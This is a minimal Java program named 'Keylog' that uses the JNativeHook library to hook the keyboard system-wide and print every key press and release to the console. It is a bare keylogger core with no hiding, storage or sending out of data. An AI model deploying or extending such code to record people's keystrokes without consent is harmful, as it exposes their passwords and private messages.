import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
public class Keylog implements NativeKeyListener {

	public static void main(String[] args) {
			try {
				GlobalScreen.registerNativeHook();
			} catch (NativeHookException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();      
			}
			GlobalScreen.addNativeKeyListener(new Keylog());     
    }

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Pressed:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		System.out.println("Released:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

}
